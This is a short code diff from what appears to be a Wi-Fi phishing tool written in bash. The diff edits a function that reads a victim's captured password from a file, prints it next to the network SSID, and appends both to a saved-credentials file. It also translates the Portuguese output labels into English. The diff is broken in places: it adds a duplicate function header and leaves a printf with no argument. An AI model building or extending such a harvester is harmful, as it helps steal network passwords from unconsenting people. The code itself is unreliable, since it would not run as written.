@@ -151,12 +151,14 @@ start() {
 }
 
 catch_cred() {
+catch_cred() {
   IFS=$'\n'
   password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Senha:\e[0m\e[1;77m %s\n\e[0m" $password
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
   printf " SSID: %s\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Salvo:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
+  echo "SSID: $use_ssid, Password: $password" >> saved.credentials.txt
   stop
   exit 1
 }
